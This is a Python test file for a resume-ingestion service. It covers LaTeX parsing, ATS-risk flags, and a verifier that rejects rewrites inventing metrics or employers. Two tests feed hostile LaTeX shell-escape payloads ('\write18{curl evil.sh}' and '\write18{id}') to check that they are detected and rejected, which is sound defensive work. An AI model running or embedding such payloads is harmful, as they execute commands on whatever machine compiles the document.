from __future__ import annotations

import pytest

from app.core.errors import HostileLatexError
from app.services.ingest.latex import analyse_latex, latex_to_text, strip_comments
from app.services.ingest.pipeline import ingest_bytes
from app.services.verifier import verify_rewrite, verify_skill_reorder


def test_comments_stripped_but_escaped_percent_kept():
    source = "50\\% faster % this is a comment\nBuild it. % another\n"
    output = strip_comments(source)
    assert "50\\% faster" in output
    assert "this is a comment" not in output


def test_latex_analysis_flags_ats_risks():
    source = r"""
\documentclass{article}
\usepackage{fontawesome5}
\begin{document}
\begin{tabular}{ll}Python & AWS\end{tabular}
\section{Skills}
\faIcon{code} Python
\end{document}
"""
    report = analyse_latex(source)
    codes = {issue.code for issue in report.issues}
    assert "fontawesome" in codes
    assert "icon_font" in codes
    assert "tabular_layout" in codes
    assert "missing_glyphtounicode" in codes
    assert report.ats_risk_score < 100
    assert not report.is_hostile


def test_latex_analysis_detects_hostile_input():
    report = analyse_latex(r"\documentclass{article}\write18{curl evil.sh}\begin{document}x\end{document}")
    assert report.is_hostile
    assert report.uses_shell_escape
    assert any(issue.code == "write18" for issue in report.issues)


def test_pipeline_rejects_hostile_latex():
    with pytest.raises(HostileLatexError):
        ingest_bytes("evil.tex", "application/x-tex", rb"\write18{id}")


def test_latex_to_text_keeps_macro_arguments():
    source = r"""
\section{Experience}
\resumeSubheading{Engineer}{Acme}{Jan 2021}{Present}
\resumeItem{Built APIs with Python.}
"""
    text = latex_to_text(source)
    assert "## Experience" in text
    assert "Engineer | Acme | Jan 2021 - Present" in text
    assert "- Built APIs with Python." in text


def test_verifier_blocks_invented_metrics():
    result = verify_rewrite("Built 3 services", "Built 5 services", [])
    assert not result.verified
    assert any("Invented numeric" in reason for reason in result.reasons)


def test_verifier_allows_metric_supplied_by_facts_bank():
    result = verify_rewrite(
        "Built services", "Built 5 services", ["Scaled the platform to 5 services"]
    )
    assert result.verified, result.reasons


def test_verifier_blocks_new_employers():
    result = verify_rewrite("Built a FastAPI service.", "Built a FastAPI service for Stripe.", [])
    assert not result.verified
    assert any("proper noun" in reason.lower() for reason in result.reasons)


def test_verifier_allows_truthful_verb_rewrite():
    result = verify_rewrite(
        "Responsible for leading a team of 5 engineers.",
        "Led a team of 5 engineers.",
        [],
    )
    assert result.verified, result.reasons


def test_verifier_skill_reorder_must_preserve_set():
    assert verify_skill_reorder(["Python", "AWS"], ["AWS", "Python"]).verified
    assert not verify_skill_reorder(["Python"], ["Python", "Go"]).verified
